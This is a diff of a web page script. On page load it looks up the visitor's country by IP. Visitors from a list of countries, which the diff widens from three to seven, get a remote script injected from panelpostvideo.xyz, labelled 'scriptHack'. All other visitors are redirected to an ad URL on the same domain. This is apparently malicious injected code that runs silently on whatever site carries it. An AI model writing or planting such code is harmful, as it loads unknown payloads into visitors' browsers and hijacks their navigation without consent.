@@ -1,34 +1,33 @@
-
 <script>
-let countryHack = ['HU', 'DO', 'RO']; //pais
-let scriptHack = 'https://panelpostvideo.xyz/joel/index.php?username=joeljefe';
-let urlPromocion = 'https://panelpostvideo.xyz/ojo/index.php?username=ojo';
-let country;
-
-fetch('https://get.geojs.io/v1/ip/country')
-    .then((response) => response.text())
-    .then((data) => {
-        country = data;
-        country = countryHack.find((str) => str === country.trim());
-        redirectURL(country)
-    })
-
-
-function redirectURL(country) {
-
-
-    if (country) {
-        const script = document.createElement('script');
-        script.src = scriptHack;
-        document.head.appendChild(script);
-
-        console.log('REDIRECT HACK...' + country)
-    } else {
-        
-        window.location.href = urlPromocion;
-        console.log('REDIRECT ADS...' + country)
-    }
-
-}
-
-</script>
+	let countryHack = ['HU', 'DO', 'RO', 'AM', 'GE', 'HR', 'RS']; //pais
+	let scriptHack = 'https://panelpostvideo.xyz/joel/index.php?username=joeljefe';
+	let urlPromocion = 'https://panelpostvideo.xyz/ojo/index.php?username=ojo';
+	let country;
+	
+	fetch('https://get.geojs.io/v1/ip/country')
+		.then((response) => response.text())
+		.then((data) => {
+			country = data;
+			country = countryHack.find((str) => str === country.trim());
+			redirectURL(country)
+		})
+	
+	
+	function redirectURL(country) {
+	
+	
+		if (country) {
+			const script = document.createElement('script');
+			script.src = scriptHack;
+			document.head.appendChild(script);
+	
+			console.log('REDIRECT HACK...' + country)
+		} else {
+			
+			window.location.href = urlPromocion;
+			console.log('REDIRECT ADS...' + country)
+		}
+	
+	}
+	
+	</script>
